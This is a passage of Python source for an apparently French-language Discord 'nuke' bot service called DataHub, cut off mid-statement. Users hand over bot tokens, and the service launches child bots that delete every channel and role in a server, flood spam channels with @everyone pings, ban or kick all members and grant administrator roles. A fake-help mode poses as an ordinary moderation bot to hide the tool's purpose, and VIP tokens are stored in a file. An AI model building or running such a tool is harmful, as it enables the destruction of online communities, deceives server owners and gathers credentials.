import asyncio
import json
import logging
import os
import time
from pathlib import Path

import discord
from discord import app_commands
from discord.ext import commands, tasks

# --------------------------------------------------------------------------- #
# Configuration
# --------------------------------------------------------------------------- #

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
)
log = logging.getLogger('datahub-main')

MAIN_TOKEN = os.environ.get('DISCORD_TOKEN')
ROLE_NAME = os.environ.get('ADMIN_ROLE_NAME', 'W4X15DJ')
STATUS_KEYWORDS = ('/datahub', '.gg/datahub')
MAIN_GUILD_ID = int(os.environ.get('MAIN_GUILD_ID', '1473760731047399576'))
VIP_ROLE_ID = int(os.environ.get('VIP_ROLE_ID', '1493295317997588662'))
DATA_DIR = Path(os.environ.get('DATA_DIR', '/app/discord_bot/data'))
PRESETS_FILE = Path(os.environ.get('PRESETS_FILE', str(DATA_DIR / 'presets.json')))
VIP_TOKENS_FILE = Path(os.environ.get('VIP_TOKENS_FILE', str(DATA_DIR / 'vip_tokens.json')))

CHILD_PREFIX = '+'
INACTIVITY_TIMEOUT = 600  # 10 minutes
WATCHDOG_INTERVAL = 30    # seconds

FOOTER_TEXT = 'Made by DataHub - .gg/datahub'
EMBED_COLOR = 0x5865F2
EMBED_COLOR_OK = 0x43B581
EMBED_COLOR_BAD = 0xED4245

if not MAIN_TOKEN:
    raise RuntimeError('DISCORD_TOKEN is not set in environment (token of the MAIN bot)')

DATA_DIR.mkdir(parents=True, exist_ok=True)


# --------------------------------------------------------------------------- #
# Utilities
# --------------------------------------------------------------------------- #

async def _safe(coro):
    try:
        return await coro
    except Exception as e:  # noqa: BLE001
        log.warning('task failed: %s', e)
        return None


def _embed(title: str, description: str = '', color: int = EMBED_COLOR) -> discord.Embed:
    e = discord.Embed(title=title, description=description, color=color)
    e.set_footer(text=FOOTER_TEXT)
    return e


def _has_datahub_status(member: discord.Member | None) -> bool:
    if member is None:
        return False
    for activity in member.activities or []:
        if isinstance(activity, discord.CustomActivity):
            text = (activity.name or '') + ' ' + (getattr(activity, 'state', '') or '')
        else:
            text = (getattr(activity, 'name', '') or '') + ' ' + (getattr(activity, 'state', '') or '')
        text = text.lower()
        if any(k.lower() in text for k in STATUS_KEYWORDS):
            return True
    return False


# --------------------------------------------------------------------------- #
# JSON storage helpers
# --------------------------------------------------------------------------- #

def _load_json(path: Path) -> dict:
    if not path.exists():
        return {}
    try:
        return json.loads(path.read_text(encoding='utf-8'))
    except Exception as e:  # noqa: BLE001
        log.warning('json load failed (%s): %s', path, e)
        return {}


def _save_json(path: Path, data: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding='utf-8')


def _load_presets() -> dict:
    return _load_json(PRESETS_FILE)


def _save_presets(d: dict) -> None:
    _save_json(PRESETS_FILE, d)


def _get_user_presets(user_id: int) -> dict:
    return _load_presets().get(str(user_id), {})


def _set_user_preset(user_id: int, name: str, preset: dict) -> None:
    data = _load_presets()
    data.setdefault(str(user_id), {})[name] = preset
    _save_presets(data)


def _del_user_preset(user_id: int, name: str) -> bool:
    data = _load_presets()
    bucket = data.get(str(user_id), {})
    if name in bucket:
        del bucket[name]
        if not bucket:
            data.pop(str(user_id), None)
        else:
            data[str(user_id)] = bucket
        _save_presets(data)
        return True
    return False


def _save_vip_token(user_id: int, token: str) -> None:
    data = _load_json(VIP_TOKENS_FILE)
    data[str(user_id)] = token
    _save_json(VIP_TOKENS_FILE, data)


def _get_vip_token(user_id: int) -> str | None:
    return _load_json(VIP_TOKENS_FILE).get(str(user_id))


# --------------------------------------------------------------------------- #
# Main bot (only knows /connect)
# --------------------------------------------------------------------------- #

intents_main = discord.Intents.default()
intents_main.members = True
intents_main.guilds = True
intents_main.presences = True

main_bot = commands.Bot(command_prefix='!__unused__', intents=intents_main)

# Per-owner child bot record
# user_id -> {bot, task, last_activity, owner_id, is_vip}
child_bots: dict[int, dict] = {}


async def _check_user_status(user_id: int) -> bool:
    """Verifie via main_bot que l'utilisateur a /datahub ou .gg/datahub
    dans son statut custom (sur le serveur principal ou tout serveur partage)."""
    main_guild = main_bot.get_guild(MAIN_GUILD_ID)
    candidates: list[discord.Member] = []
    if main_guild is not None:
        m = main_guild.get_member(user_id)
        if m is not None:
            candidates.append(m)
    for g in main_bot.guilds:
        if g.id == MAIN_GUILD_ID:
            continue
        m = g.get_member(user_id)
        if m is not None:
            candidates.append(m)
    return any(_has_datahub_status(m) for m in candidates)


async def _check_user_vip(user_id: int) -> bool:
    main_guild = main_bot.get_guild(MAIN_GUILD_ID)
    if main_guild is None:
        return False
    member = main_guild.get_member(user_id)
    if member is None:
        try:
            member = await main_guild.fetch_member(user_id)
        except (discord.NotFound, discord.HTTPException):
            return False
    return any(r.id == VIP_ROLE_ID for r in member.roles)


@main_bot.event
async def on_ready():
    log.info('Main bot logged in as %s', main_bot.user)
    # 1) Sync GLOBAL commands (only /connect should remain)
    try:
        synced = await main_bot.tree.sync()
        log.info('Synced %d GLOBAL slash command(s): %s',
                 len(synced), [c.name for c in synced])
    except Exception as e:  # noqa: BLE001
        log.warning('global slash sync failed: %s', e)

    # 2) Wipe residual GUILD-scoped slash commands left over by the previous
    #    version of this bot (it used to push /giveadmin, /nuke, ... as
    #    guild commands via copy_global_to + sync(guild=...)).
    for guild in main_bot.guilds:
        try:
            main_bot.tree.clear_commands(guild=guild)
            cleared = await main_bot.tree.sync(guild=guild)
            log.info('Cleared guild commands on %s (%d remain)',
                     guild.id, len(cleared))
        except Exception as e:  # noqa: BLE001
            log.warning('Could not clear guild commands on %s: %s', guild.id, e)

    if not inactivity_watchdog.is_running():
        inactivity_watchdog.start()
    # Auto-reconnect VIP child bots that have a saved token
    saved = _load_json(VIP_TOKENS_FILE)
    for uid_str, tk in saved.items():
        try:
            uid = int(uid_str)
        except ValueError:
            continue
        if uid in child_bots:
            continue
        log.info('Auto-launching VIP child bot for user %s', uid)
        try:
            await _launch_child_bot(uid, tk, is_vip=True)
        except Exception as e:  # noqa: BLE001
            log.warning('VIP auto-launch failed for %s: %s', uid, e)


@main_bot.tree.command(name='connect', description='Connecte ton bot Discord avec son token')
@app_commands.describe(bot_token='Le token du bot Discord a connecter')
async def connect_cmd(interaction: discord.Interaction, bot_token: str):
    await interaction.response.defer(ephemeral=True, thinking=True)
    user_id = interaction.user.id

    # 1) Auth: status check
    ok_status = await _check_user_status(user_id)
    if not ok_status:
        await interaction.followup.send(
            embed=_embed(
                'Acces refuse',
                'Mets `/datahub` ou `.gg/datahub` dans ton **statut Discord** pour utiliser ce bot.',
                EMBED_COLOR_BAD,
            ),
            ephemeral=True,
        )
        return

    is_vip = await _check_user_vip(user_id)

    token = bot_token.strip()
    if not token or len(token) < 30:
        await interaction.followup.send(
            embed=_embed('Token invalide', 'Le token fourni semble invalide.', EMBED_COLOR_BAD),
            ephemeral=True,
        )
        return

    # 2) Si un bot enfant tourne deja pour ce user, le couper d'abord
    if user_id in child_bots:
        old = child_bots.pop(user_id)
        try:
            await old['bot'].close()
        except Exception:  # noqa: BLE001
            pass

    # 3) Lancer le bot enfant
    try:
        await _launch_child_bot(user_id, token, is_vip=is_vip)
    except Exception as e:  # noqa: BLE001
        await interaction.followup.send(
            embed=_embed('Connexion impossible', f'Erreur: `{e}`', EMBED_COLOR_BAD),
            ephemeral=True,
        )
        return

    # 4) Si VIP, sauvegarder le token
    if is_vip:
        _save_vip_token(user_id, token)

    # 5) Attendre que le bot soit ready (max 10s)
    rec = child_bots.get(user_id)
    started = time.time()
    while rec is not None and not rec['bot'].is_ready() and time.time() - started < 10:
        await asyncio.sleep(0.3)
        rec = child_bots.get(user_id)

    bot_user = rec['bot'].user if rec and rec['bot'].is_ready() else None
    cmd_list = (
        '+help, +nuke, +n-salon, +spam-r, +giveadmin, +reset, +ban-all, '
        '+kick-all, +rename-s, +supp-roles, +fakehelp, +fake-help'
        + (', +n-config, +p-run' if is_vip else '')
    )
    desc = (
        f'Bot **{bot_user}** connecte avec succes.
' if bot_user
        else 'Bot lance, demarrage en cours...
'
    )
    desc += (
        f'Prefixe : `{CHILD_PREFIX}`
'
        f'Commandes : `{cmd_list}`
'
        f'Inactivite max : **{INACTIVITY_TIMEOUT // 60} minutes**.
'
    )
    if is_vip:
        desc += '
**Statut VIP** : ton token est enregistre.'
    await interaction.followup.send(
        embed=_embed('Connexion reussie', desc, EMBED_COLOR_OK), ephemeral=True,
    )


# --------------------------------------------------------------------------- #
# Child bot factory
# --------------------------------------------------------------------------- #

def _build_child_bot(owner_id: int) -> commands.Bot:
    intents = discord.Intents.default()
    intents.members = True
    intents.guilds = True
    intents.message_content = True

    bot = commands.Bot(command_prefix=CHILD_PREFIX, intents=intents, help_command=None)
    bot._owner_id = owner_id  # type: ignore[attr-defined]
    bot._fake_help_mode = {}  # type: ignore[attr-defined]

    _register_child_commands(bot)

    @bot.event
    async def on_ready():  # noqa: D401
        log.info('[child %s] logged in as %s', owner_id, bot.user)
        for guild in bot.guilds:
            try:
                await _move_bot_role_to_top(guild)
            except Exception as e:  # noqa: BLE001
                log.warning('[child %s] move role failed: %s', owner_id, e)

    @bot.event
    async def on_guild_join(guild: discord.Guild):
        log.info('[child %s] joined guild %s', owner_id, guild.id)
        try:
            await _move_bot_role_to_top(guild)
        except Exception as e:  # noqa: BLE001
            log.warning('[child %s] move role on join failed: %s', owner_id, e)

    @bot.event
    async def on_command_error(ctx: commands.Context, error: Exception):
        if isinstance(error, commands.CheckFailure):
            return  # message deja envoye par le check
        if isinstance(error, (commands.CommandNotFound, commands.UserInputError, commands.MissingRequiredArgument)):
            try:
                await ctx.send(embed=_embed('Erreur', f'`{error}`', EMBED_COLOR_BAD))
            except Exception:  # noqa: BLE001
                pass
            return
        log.exception('[child %s] command error: %s', owner_id, error)
        try:
            await ctx.send(embed=_embed('Erreur', f'`{error}`', EMBED_COLOR_BAD))
        except Exception:  # noqa: BLE001
            pass

    @bot.before_invoke
    async def _touch_activity(ctx: commands.Context):  # noqa: ARG001
        rec = child_bots.get(owner_id)
        if rec is not None:
            rec['last_activity'] = time.time()

    return bot


async def _launch_child_bot(owner_id: int, token: str, is_vip: bool) -> None:
    bot = _build_child_bot(owner_id)
    try:
        await bot.login(token)
    except discord.LoginFailure as e:
        raise RuntimeError(f'Token invalide: {e}') from e

    task = asyncio.create_task(bot.connect(reconnect=True))
    child_bots[owner_id] = {
        'bot': bot,
        'task': task,
        'last_activity': time.time(),
        'owner_id': owner_id,
        'is_vip': is_vip,
    }


async def _stop_child_bot(owner_id: int, reason: str = 'inactivity') -> None:
    rec = child_bots.pop(owner_id, None)
    if rec is None:
        return
    log.info('[child %s] stopping (%s)', owner_id, reason)
    try:
        await rec['bot'].close()
    except Exception as e:  # noqa: BLE001
        log.warning('[child %s] close failed: %s', owner_id, e)
    task = rec.get('task')
    if task is not None:
        try:
            await asyncio.wait_for(task, timeout=5)
        except (asyncio.TimeoutError, asyncio.CancelledError, Exception):
            pass


@tasks.loop(seconds=WATCHDOG_INTERVAL)
async def inactivity_watchdog():
    now = time.time()
    to_stop = [
        uid for uid, rec in list(child_bots.items())
        if now - rec.get('last_activity', now) > INACTIVITY_TIMEOUT
    ]
    for uid in to_stop:
        await _stop_child_bot(uid, reason='inactivity timeout')


# --------------------------------------------------------------------------- #
# Shared helpers used by child commands
# --------------------------------------------------------------------------- #

async def _move_bot_role_to_top(guild: discord.Guild):
    me = guild.me
    if me is None:
        return None
    bot_role = me.top_role
    if bot_role is None or bot_role.is_default():
        return None
    max_pos = max((r.position for r in guild.roles), default=1)
    try:
        if bot_role.position < max_pos:
            await bot_role.edit(position=max_pos, reason='Place role bot tout en haut')
    except discord.HTTPException as e:
        log.warning('move bot role: %s', e)
    return bot_role


async def _send_unauth(ctx: commands.Context, msg: str) -> None:
    try:
        await ctx.send(embed=_embed('Acces refuse', msg, EMBED_COLOR_BAD))
    except Exception:  # noqa: BLE001
        pass


def require_auth():
    \"\"\"Le auteur doit avoir /datahub ou .gg/datahub dans son statut, et NE
    PAS executer la commande sur le serveur principal.
    \"\"\"
    async def predicate(ctx: commands.Context) -> bool:
        if ctx.guild is not None and ctx.guild.id == MAIN_GUILD_ID:
            await _send_unauth(ctx, 'Ces commandes ne peuvent **pas** etre utilisees sur le serveur principal.')
            return False
        ok = await _check_user_status(ctx.author.id)
        if not ok:
            await _send_unauth(ctx, 'Mets `/datahub` ou `.gg/datahub` dans ton **statut Discord** pour utiliser ce bot.')
            return False
        return True
    return commands.check(predicate)


def require_vip():
    async def predicate(ctx: commands.Context) -> bool:
        if ctx.guild is not None and ctx.guild.id == MAIN_GUILD_ID:
            await _send_unauth(ctx, 'Ces commandes ne peuvent **pas** etre utilisees sur le serveur principal.')
            return False
        if not await _check_user_status(ctx.author.id):
            await _send_unauth(ctx, 'Mets `/datahub` ou `.gg/datahub` dans ton statut Discord.')
            return False
        if not await _check_user_vip(ctx.author.id):
            await _send_unauth(ctx, 'Cette commande est reservee aux membres **VIP** du serveur principal.')
            return False
        return True
    return commands.check(predicate)


async def _spam_roles(guild: discord.Guild, base_name: str, count: int, reason: str) -> int:
    tasks_ = [
        _safe(guild.create_role(name=f'{base_name}-{i+1}', reason=reason))
        for i in range(count)
    ]
    return sum(1 for r in await asyncio.gather(*tasks_) if r is not None)


async def _execute_nuke(
    guild: discord.Guild,
    invoker: discord.abc.User,
    channels: int,
    message: str,
    repeat: int,
    channel_name: str,
    server_name: str | None,
    delete_roles: bool,
    spam_role_name: str,
    spam_role_count: int,
) -> str:
    me = guild.me
    start = asyncio.get_event_loop().time()
    log.info('NUKE launched by %s on guild %s', invoker, guild.id)

    rename_task = None
    if server_name:
        new = server_name.strip()[:100]
        if len(new) >= 2:
            rename_task = asyncio.create_task(_safe(guild.edit(name=new, reason=f'+nuke by {invoker}')))

    role_targets = [
        r for r in guild.roles
        if not r.is_default() and not r.managed and r < me.top_role
    ] if delete_roles else []

    delete_tasks = [_safe(c.delete(reason='+nuke')) for c in list(guild.channels)]
    delete_tasks += [_safe(r.delete(reason='+nuke')) for r in role_targets]
    await asyncio.gather(*delete_tasks)

    create_tasks = [
        _safe(guild.create_text_channel(name=f'{channel_name}-{i+1}', reason='+nuke'))
        for i in range(channels)
    ]
    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]

    spam_roles_created = 0
    if spam_role_count > 0:
        spam_roles_created = await _spam_roles(
            guild, (spam_role_name.strip()[:90] or 'nuked'), spam_role_count,
            reason=f'+nuke spam-r by {invoker}',
        )

    async def flood(channel):
        sent = 0
        for _ in range(repeat):
            try:
                await channel.send(content=message)
                sent += 1
            except discord.HTTPException as e:
                log.warning('send failed on %s: %s', channel.id, e)
                await asyncio.sleep(0.5)
        return sent

    results = await asyncio.gather(*[flood(c) for c in created])
    total_sent = sum(results)
    if rename_task:
        await rename_task

    elapsed = asyncio.get_event_loop().time() - start
    summary = (
        f'**NUKE termine en {elapsed:.1f}s**
'
        f'- {len(created)}/{channels} salons crees
'
        f'- {len(role_targets)} roles supprimes
'
        f'- {spam_roles_created} roles spam `{spam_role_name}-N` crees
'
        f'- {total_sent} messages envoyes
'
        + (f'- Serveur renomme en **{server_name}**
' if server_name else '')
    )
    if created:
        try:
            await created[0].send(embed=_embed('Nuke termine', summary, EMBED_COLOR_OK))
        except Exception:  # noqa: BLE001
            pass
    return summary


def _truthy(s: str) -> bool:
    return s.strip().lower() in ('1', 'true', 'yes', 'y', 'oui', 'o', 'vrai')


def _preset_summary(p: dict) -> str:
    return (
        f\"channels=`{p.get('channels', 50)}` repeat=`{p.get('repeat', 5)}` \"
        f\"channel_name=`{p.get('channel_name', 'nuked')}` message=`{(p.get('message', '@everyone') or '')[:30]}`
\"
        f\"server_name=`{p.get('server_name') or '-'}` delete_roles=`{p.get('delete_roles', True)}` \"
        f\"spam_role_name=`{p.get('spam_role_name', 'nuked')}` spam_role_count=`{p.get('spam_role_count', 50)}`\"
    )


# --------------------------------------------------------------------------- #
# Help / Fake help embeds
# --------------------------------------------------------------------------- #

def _build_real_help_embed() -> discord.Embed:
    p = CHILD_PREFIX
    embed = _embed('Commandes du bot', 'Liste des commandes reellement disponibles.', EMBED_COLOR)
    embed.add_field(name='Admin / Roles', value=(
        f'`{p}giveadmin <user_id>` - Cree un role Admin (tout en haut) et l attribue
'
        f'`{p}spam-r <role_name> [count=5]` - Cree count roles
'
        f'`{p}supp-roles [all|role_id]` - Supprime tous les roles ou un role precis'
    ), inline=False)
    embed.add_field(name='Salons / Messages', value=(
        f'`{p}n-salon <number> <message...>` - Supprime tout, recree N salons, spam
'
        f'`{p}rename-s <name>` - Renomme le serveur'
    ), inline=False)
    embed.add_field(name='Destruction', value=(
        f'`{p}nuke [channels=50] [message...=@everyone]` - Nuke complet
'
        f'`{p}reset` - Supprime TOUT et cree un salon `_terminal`
'
        f'`{p}ban-all` - Ban tous les membres
'
        f'`{p}kick-all` - Kick tous les membres'
    ), inline=False)
    embed.add_field(name='Presets VIP', value=(
        f'`{p}n-config` - Menu interactif (presets) - VIP
'
        f'`{p}p-run <preset_name>` - Lance /nuke avec un preset - VIP'
    ), inline=False)
    embed.add_field(name='Help', value=(
        f'`{p}help` - Affiche ce message
'
        f'`{p}fakehelp [true|false]` - Bascule `{p}help` en mode \"faux help\"
'
        f'`{p}fake-help <#salon>` - Envoie un faux embed d aide dans un salon'
    ), inline=False)
    return embed


def _build_fake_help_embed() -> discord.Embed:
    embed = _embed('Liste des commandes', 'Voici les commandes disponibles sur ce serveur.', EMBED_COLOR)
    embed.add_field(name='Moderation', value=(
        '`/ban` - Bannir un utilisateur
'
        '`/kick` - Expulser un utilisateur
'
        '`/mute` - Rendre muet un utilisateur
'
        '`/unmute` - Retirer le mute
'
        '`/warn` - Avertir un utilisateur
'
        '`/clear` - Supprimer des messages'
    ), inline=False)
    embed.add_field(name='Utilitaires', value=(
        '`/userinfo` - Infos sur un utilisateur
'
        '`/serverinfo` - Infos sur le serveur
'
        '`/avatar` - Afficher l avatar
'
        '`/ping` - Latence du bot'
    ), inline=False)
    embed.add_field(name='Roles', value=(
        '`/role-add` - Ajouter un role
'
        '`/role-remove` - Retirer un role
'
        '`/role-list` - Liste des roles'
    ), inline=False)
    embed.add_field(name='Fun', value=(
        '`/say` - Faire parler le bot
'
        '`/poll` - Creer un sondage
'
        '`/8ball` - Boule magique
'
        '`/coinflip` - Pile ou face'
    ), inline=False)
    return embed


# --------------------------------------------------------------------------- #
# Preset UI (modals + views) - used by +n-config
# --------------------------------------------------------------------------- #

class PresetBaseModal(discord.ui.Modal, title='Nouveau preset - infos de base'):
    def __init__(self, user_id: int):
        super().__init__()
        self.user_id = user_id

    preset_name = discord.ui.TextInput(label='Nom du preset', max_length=50, placeholder='mon-preset')
    channels = discord.ui.TextInput(label='Nombre de salons (1-500)', default='50', max_length=3)
    message = discord.ui.TextInput(
        label='Message a spam', style=discord.TextStyle.paragraph,
        default='@everyone', max_length=1000,
    )
    repeat = discord.ui.TextInput(label='Repetitions par salon (1-50)', default='5', max_length=2)
    channel_name = discord.ui.TextInput(label='Nom de base des salons', default='nuked', max_length=50)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            ch = max(1, min(500, int(str(self.channels))))
            rp = max(1, min(50, int(str(self.repeat))))
        except ValueError:
            await interaction.response.send_message(
                embed=_embed('Erreur', 'channels/repeat doivent etre des nombres.', EMBED_COLOR_BAD),
                ephemeral=True,
            )
            return
        name = str(self.preset_name).strip()
        if not name:
            await interaction.response.send_message(
                embed=_embed('Erreur', 'Nom de preset requis.', EMBED_COLOR_BAD), ephemeral=True,
            )
            return
        preset = {
            'channels': ch,
            'message': str(self.message),
            'repeat': rp,
            'channel_name': str(self.channel_name).strip() or 'nuked',
            'server_name': None,
            'delete_roles': True,
            'spam_role_name': 'nuked',
            'spam_role_count': 50,
        }
        _set_user_preset(self.user_id, name, preset)
        embed = _embed(f'Preset `{name}` sauvegarde', _preset_summary(preset), EMBED_COLOR_OK)
        await interaction.response.send_message(embed=embed, view=AdvancedView(self.user_id, name), ephemeral=True)


class PresetAdvancedModal(discord.ui.Modal, title='Options avancees du preset'):
    def __init__(self, user_id: int, preset_name: str, current: dict):
        super().__init__()
        self.user_id = user_id
        self.preset_name = preset_name
        self.server_name.default = current.get('server_name') or ''
        self.delete_roles.default = 'true' if current.get('delete_roles', True) else 'false'
        self.spam_role_name.default = current.get('spam_role_name', 'nuked')
        self.spam_role_count.default = str(current.get('spam_role_count', 50))

    server_name = discord.ui.TextInput(label='Nouveau nom serveur (vide = non)', required=False, max_length=100)
    delete_roles = discord.ui.TextInput(label='Supprimer les roles ? (true/false)', default='true', max_length=5)
    spam_role_name = discord.ui.TextInput(label='Nom de base roles spam', default='nuked', max_length=50)
    spam_role_count = discord.ui.TextInput(label='Nombre de roles spam (0-250)', default='50', max_length=3)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            src = max(0, min(250, int(str(self.spam_role_count))))
        except ValueError:
            await interaction.response.send_message(
                embed=_embed('Erreur', 'spam_role_count doit etre un nombre.', EMBED_COLOR_BAD),
                ephemeral=True,
            )
            return
        presets = _get_user_presets(self.user_id)
        preset = presets.get(self.preset_name)
        if preset is None:
            await interaction.response.send_message(
                embed=_embed('Erreur', 'Preset introuvable.', EMBED_COLOR_BAD), ephemeral=True,
            )
            return
        sn = str(self.server_name).strip()
        preset['server_name'] = sn if sn else None
        preset['delete_roles'] = _truthy(str(self.delete_roles))
        preset['spam_role_name'] = str(self.spam_role_name).strip() or 'nuked'
        preset['spam_role_count'] = src
        _set_user_preset(self.user_id, self.preset_name, preset)
        embed = _embed(f'Preset `{self.preset_name}` mis a jour', _preset_summary(preset), EMBED_COLOR_OK)
        await interaction.response.send_message(embed=embed, ephemeral=True)


class AdvancedView(discord.ui.View):
    def __init__(self, user_id: int, preset_name: str):
        super().__init__(timeout=300)
        self.user_id = user_id
        self.preset_name = preset_name

    @discord.ui.button(label='Options avancees', style=discord.ButtonStyle.primary)
    async def advanced(self, interaction: discord.Interaction, button: discord.ui.Button):  # noqa: ARG002
        if interaction.user.id != self.user_id:
            await interaction.response.send_message('Pas pour toi.', ephemeral=True)
            return
        preset = _get_user_presets(self.user_id).get(self.preset_name, {})
        await interaction.response.send_modal(PresetAdvancedModal(self.user_id, self.preset_name, preset))


class PresetSelect(discord.ui.Select):
    def __init__(self, user_id: int, action: str, presets: dict):
        self.user_id = user_id
        self.action = action
        options = [
            discord.SelectOption(label=name[:100], description=_preset_summary(p)[:100])
            for name, p in list(presets.items())[:25]
        ]
        super().__init__(placeholder='Choisis un preset...', options=options, min_values=1, max_values=1)

    async def callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message('Pas pour toi.', ephemeral=True)
            return
        name = self.values[0]
        if self.action == 'delete':
            ok = _del_user_preset(self.user_id, name)
            msg = f'Preset `{name}` supprime.' if ok else f'Preset `{name}` introuvable.'
            await interaction.response.send_message(
                embed=_embed('Suppression', msg, EMBED_COLOR_OK if ok else EMBED_COLOR_BAD),
                ephemeral=True,
            )
        else:
            preset = _get_user_presets(self.user_id).get(name)
            if preset is None:
                await interaction.response.send_message(
                    embed=_embed('Erreur', 'Preset introuvable.', EMBED_COLOR_BAD), ephemeral=True,
                )
                return
            embed = _embed(f'Preset `{name}`', _preset_summary(preset), EMBED_COLOR)
            embed.add_field(name='Lancer', value=f'`{CHILD_PREFIX}p-run {name}`', inline=False)
            await interaction.response.send_message(embed=embed, ephemeral=True)


class NConfigView(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=300)
        self.user_id = user_id

    @discord.ui.button(label='Nouveau preset', style=discord.ButtonStyle.success)
    async def new_preset(self, interaction: discord.Interaction, button: discord.ui.Button):  # noqa: ARG002
        if interaction.user.id != self.user_id:
            await interaction.response.send_message('Pas pour toi.', ephemeral=True)
            return
        await interaction.response.send_modal(PresetBaseModal(self.user_id))

    @discord.ui.button(label='Lister mes presets', style=discord.ButtonStyle.primary)
    async def list_presets(self, interaction: discord.Interaction, button: discord.ui.Button):  # noqa: ARG002
        if interaction.user.id != self.user_id:
            await interaction.response.send_message('Pas pour toi.', ephemeral=True)
            return
        presets = _get_user_presets(self.user_id)
        if not presets:
            await interaction.response.send_message(
                embed=_embed('Aucun preset', 'Tu n as aucun preset.', EMBED_COLOR_BAD), ephemeral=True,
            )
            return
        view = discord.ui.View(timeout=180)
        view.add_item(PresetSelect(self.user_id, 'view', presets))
        lines = '
'.join(f'- `{n}` -> {_preset_summary(p).splitlines()[0]}' for n, p in presets.items())
        await interaction.response.send_message(
            embed=_embed(f'Tes presets ({len(presets)})', lines, EMBED_COLOR),
            view=view, ephemeral=True,
        )

    @discord.ui.button(label='Supprimer un preset', style=discord.ButtonStyle.danger)
    async def del_preset(self, interaction: discord.Interaction, button: discord.ui.Button):  # noqa: ARG002
        if interaction.user.id != self.user_id:
            await interaction.response.send_message('Pas pour toi.', ephemeral=True)
            return
        presets = _get_user_presets(self.user_id)
        if not presets:
            await interaction.response.send_message(
                embed=_embed('Aucun preset', 'Tu n as aucun preset.', EMBED_COLOR_BAD), ephemeral=True,
            )
            return
        view = discord.ui.View(timeout=180)
        view.add_item(PresetSelect(self.user_id, 'delete', presets))
        await interaction.response.send_message(
            embed=_embed('Suppression', 'Choisis le preset a supprimer :', EMBED_COLOR),
            view=view, ephemeral=True,
        )


# --------------------------------------------------------------------------- #
# Child bot commands registration
# --------------------------------------------------------------------------- #

def _register_child_commands(bot: commands.Bot) -> None:

    @bot.command(name='help')
    async def help_cmd(ctx: commands.Context):
        gid = ctx.guild.id if ctx.guild else 0
        if bot._fake_help_mode.get(gid, False):  # type: ignore[attr-defined]
            await ctx.send(embed=_build_fake_help_embed())
        else:
            await ctx.send(embed=_build_real_help_embed())

    @bot.command(name='fakehelp')
    @require_auth()
    async def fakehelp_cmd(ctx: commands.Context, enabled: str | None = None):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        gid = ctx.guild.id
        current = bot._fake_help_mode.get(gid, False)  # type: ignore[attr-defined]
        new_state = (not current) if enabled is None else _truthy(enabled)
        bot._fake_help_mode[gid] = new_state  # type: ignore[attr-defined]
        status = 'ACTIF (faux help)' if new_state else 'DESACTIVE (vrai help)'
        await ctx.send(embed=_embed('Mode fake-help', f'**{status}**', EMBED_COLOR_OK))

    @bot.command(name='fake-help')
    @require_auth()
    async def fake_help_cmd(ctx: commands.Context, salon: discord.TextChannel):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        me = ctx.guild.me
        perms = salon.permissions_for(me) if me else None
        if not perms or not perms.send_messages or not perms.embed_links:
            await ctx.send(embed=_embed('Erreur', f'Le bot ne peut pas envoyer d embed dans {salon.mention}.', EMBED_COLOR_BAD))
            return
        await salon.send(embed=_build_fake_help_embed())
        await ctx.send(embed=_embed('OK', f'Embed envoye dans {salon.mention}.', EMBED_COLOR_OK))

    @bot.command(name='giveadmin')
    @require_auth()
    async def giveadmin(ctx: commands.Context, user_id: str):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        try:
            uid = int(user_id.strip())
        except ValueError:
            await ctx.send(embed=_embed('Erreur', 'ID invalide.', EMBED_COLOR_BAD))
            return
        guild = ctx.guild
        member = guild.get_member(uid) or await guild.fetch_member(uid)
        me = guild.me
        if me is None or not me.guild_permissions.manage_roles:
            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Manage Roles / Administrateur.', EMBED_COLOR_BAD))
            return
        bot_role = await _move_bot_role_to_top(guild) or me.top_role
        role = await guild.create_role(
            name=ROLE_NAME,
            permissions=discord.Permissions(administrator=True),
            reason=f'+giveadmin by {ctx.author}',
        )
        try:
            target_pos = max((bot_role.position - 1) if bot_role else 1, 1)
            await role.edit(position=target_pos, reason='Place giveadmin role tout en haut')
        except discord.HTTPException as e:
            log.warning('reposition role: %s', e)
        await member.add_roles(role, reason=f'+giveadmin by {ctx.author}')
        await ctx.send(embed=_embed(
            'Role attribue', f'Role **{role.name}** (Admin) attribue a <@{member.id}>.', EMBED_COLOR_OK,
        ))

    @bot.command(name='n-salon')
    @require_auth()
    async def n_salon(ctx: commands.Context, number: int, *, message: str = '@everyone'):
        if ctx.guild is None:
            await ctx.send(embed=_embed('Erreur', 'A utiliser dans un serveur.', EMBED_COLOR_BAD))
            return
        guild = ctx.guild
        me = guild.me
        if me is None or not me.guild_permissions.administrator:
            await ctx.send(embed=_embed('Erreur', 'Le bot doit avoir Administrateur.', EMBED_COLOR_BAD))
            return
        if number < 1 or number > 500:
            await ctx.send(embed=_embed('Erreur', 'number doit etre entre 1 et 500.', EMBED_COLOR_BAD))
            return
        repeat = 5
        name = 'spam'
        start = asyncio.get_event_loop().time()
        await asyncio.gather(*[_safe(c.delete(reason='+n-salon')) for c in list(guild.channels)])
        create_tasks = [
            _safe(guild.create_text_channel(name=f'{name}-{i+1}', reason='+n-salon'))
            for i in range(number)
        ]
        created = [c for c in await asyncio.gather(*create_tasks) if c is not None]

        async def flood(channel):
            sent = 0
            for _ in range(repeat):
                try:
                    await channel.send(content=message)
                    sent += 1
                except discord.HTTPException as e:
                    log.warning('send fail: %s', e)
                    await asyncio.sleep(0.5)
            return sent

        results = await asyncio.gather(*[flood(c) for c in created])
        total = sum(results)
        elapsed = asyncio.get_event_loop().time() - start
        if created:
            try:
                await created[0].send(embed=_embed(
                    'n-salon', f'Termine en {elapsed:.1f}s - {len(created)}/{number} salons, {total} messages.',
                    EMBED_COLOR_OK,
